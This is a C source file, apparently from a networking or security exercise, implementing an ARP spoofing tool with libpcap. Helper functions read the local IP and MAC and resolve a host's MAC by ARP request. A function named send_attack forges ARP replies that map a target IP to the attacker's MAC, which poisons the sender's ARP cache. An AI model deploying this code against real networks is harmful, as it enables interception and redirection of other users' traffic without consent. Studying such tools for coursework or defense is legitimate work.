#include "send-arp.h"
#include <stdio.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdint.h>

bool get_my_ip(const char* dev, uint32_t* my_ip) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        printf("couldn't create socket\n");
        return false;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        printf("fail ioctl\n");
        close(fd);
        return false;
    }
    close(fd);

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    *my_ip = ntohl(ipaddr->sin_addr.s_addr);
    return true;
}

bool get_my_mac(const char* dev, Mac* my_mac) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        printf("couldn't create socket\n");
        return false;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        printf("fail ioctl\n");
        close(fd);
        return false;
    }
    close(fd);

    memcpy(my_mac->mac, ifr.ifr_hwaddr.sa_data, 6);
    return true;
}

bool get_mac(pcap_t* handle, uint32_t my_ip, const Mac* my_mac,
             uint32_t host_ip, Mac* host_mac) {
    EthArp_packet packet;
    Mac broadcast_mac = {{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}};
    Mac zero_mac = {{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}};

    packet.eth_.dmac = broadcast_mac;
    packet.eth_.smac = *my_mac;
    packet.eth_.type = htons(ETHTYPE_ARP);

    packet.arp_.htype = htons(1);
    packet.arp_.ptype = htons(ETHTYPE_IP);
    packet.arp_.hlen = 6;
    packet.arp_.plen = 4;
    packet.arp_.op = htons(ARPOP_REQUEST);
    packet.arp_.smac = *my_mac;
    packet.arp_.sip = htonl(my_ip);
    packet.arp_.tmac = zero_mac;
    packet.arp_.tip = htonl(host_ip);

    int res = pcap_sendpacket(handle, (const u_char*)&packet, sizeof(EthArp_packet));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }

    while (1) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        int res = pcap_next_ex(handle, &header, &recv_packet);

        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return false;
        }

        if (header->caplen < sizeof(EthArp_packet)) continue;

        Eth_hdr* eth = (Eth_hdr*)recv_packet;
        if (ntohs(eth->type) != ETHTYPE_ARP) continue;

        Arp_hdr* arp = (Arp_hdr*)(recv_packet + sizeof(Eth_hdr));
        if (ntohl(arp->sip) == host_ip && ntohs(arp->op) == ARPOP_REPLY && ntohl(arp->tip) == my_ip) {
            *host_mac = arp->smac;
            return true;
        }
    }

    return false;
}

void send_attack(pcap_t* handle, const Mac* my_mac, const Flow* flow) {
    EthArp_packet packet;

    packet.eth_.dmac = flow->sender_mac;
    packet.eth_.smac = *my_mac;
    packet.eth_.type = htons(ETHTYPE_ARP);

    packet.arp_.htype = htons(1);
    packet.arp_.ptype = htons(ETHTYPE_IP);
    packet.arp_.hlen = 6;
    packet.arp_.plen = 4;
    packet.arp_.op = htons(ARPOP_REPLY);

    packet.arp_.smac = *my_mac;
    packet.arp_.sip = htonl(flow->target_ip);
    packet.arp_.tmac = flow->sender_mac;
    packet.arp_.tip = htonl(flow->sender_ip);

    int res = pcap_sendpacket(handle, (const u_char*)&packet, sizeof(EthArp_packet));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
    }
}


/*
const char* mac_to_str(const Mac* mac, char* mac_str, size_t mac_str_size) {
    if (mac_str_size < 18) return NULL;

    snprintf(mac_str, mac_str_size,
             "%02x:%02x:%02x:%02x:%02x:%02x",
             mac->mac[0], mac->mac[1], mac->mac[2],
             mac->mac[3], mac->mac[4], mac->mac[5]);

    return mac_str;
}
*/